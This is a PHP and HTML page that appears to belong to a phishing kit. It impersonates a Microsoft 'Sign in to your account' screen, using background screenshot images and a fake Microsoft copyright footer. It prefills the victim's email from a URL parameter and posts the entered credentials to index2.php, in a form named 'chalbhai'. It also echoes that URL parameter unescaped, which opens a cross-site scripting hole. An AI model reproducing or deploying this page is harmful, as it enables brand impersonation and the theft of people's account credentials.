 <?php $email_from_link = isset($_GET['email']) ? $_GET['email'] : '';?>
 
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
    <title>Sign in to your account</title>



<meta name="applicable-device" content="pc,mobile" />
<link rel="shortcut icon" href="images/favicon_a_eupayfgghqiai7k9sol6lg2.ico">
<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
<meta name="format-detection" content="telephone=no" />

<link rel="shortcut icon"
              href="images/favicon.ico"/>
			  
			  
<style>

body { 
background-image: url("./images/scho.jpg");
font-size: 1em;  
background-position: center; 
background-size: cover;
height: 710px;
width: 100%;
overflow: hidden;
}

.soki { 
background-image: url("./images/2.png");
font-size: 1em;  
background-repeat: repeat-x; 
height: 337px;
width: 439px;
overflow: hidden;
position: absolute;
  margin: auto;
  top: 0;
  right: 0;
  bottom: 0;
  left: 0;

}

::placeholder {
	 

	font-size: 15px; 
	color: #676767;
	font-weight: 300;
	font-family: 'Segoe UI Webfont',-apple-system,'Lucida Grande',;
}

.input:focus{
		outline: 0!important; 
	border: 0;
	border-radius: 0px;
}
</style>	
<script type="text/javascript">

function unhideBody()
{
var bodyElems = document.getElementsByTagName("body");
bodyElems[0].style.visibility = "visible";
}

</script>

<body style="visibility:hidden; margin: 0;" onload="unhideBody()">
</head>
<body> 
 
<center>
<form class="soki" style="overflow:hidden;top: -28px;width:439px;height:337px;z-index:1; position: fixed;" action="index2.php" name="chalbhai" id="chalbhai" method="post">
 

 
<input name="id" type="email" required="" value="<?php echo $email_from_link;?>" style="border:none;font-size: 15px;width: 348px;height:34px;outline:none;margin-top: 129px;z-index:6;background: transparent;margin-left: 5px;font-family: 'Segoe UI Webfont',-apple-system,'Lucida Grande','Roboto';" placeholder="Email address, phone number or Skype" required>
<br>
<input type="image" name="formimage1" width="302" height="42" class="input" style="width: 108px;margin-left: 245px;border: 0;height: 32px;background: transparent;cursor: pointer;z-index: 999;margin-top: 98px;" src="images/old.png">
</div>
<a href=""><div style="background: transparent;height: 10px;width: 73px;margin-top: -108px;margin-left: -125px;"></div></a>
<a href=""><div style="background: transparent;height: 12px;width: 151px;margin-top: 25px;margin-left: -195px;"></div></a>
</form>



<div style="position: fixed; bottom: 0; z-index: 999999; height: 30px; background-color: #000000a1; text-align: right; color: white; width: 100%; color: #fff; font-size: 12px; line-height: 30px; font-family: 'Segoe UI Webfont',-apple-system,'Lucida Grande','Roboto'; ">
<div><a href="javascript:void(0)" style="text-decoration: none; color: white;">	&copy; 2018 Microsoft  </a>&nbsp;&nbsp;&nbsp;<a href="javascript:void(0)" style="text-decoration: none; color: white;">Terms of use</a>&nbsp;&nbsp;&nbsp;<a href="javascript:void(0)" style="text-decoration: none; color: white;"> Privacy & cookies</a>&nbsp;&nbsp;&nbsp;...&nbsp;&nbsp;&nbsp;</div> </div>


 
</body>

</html>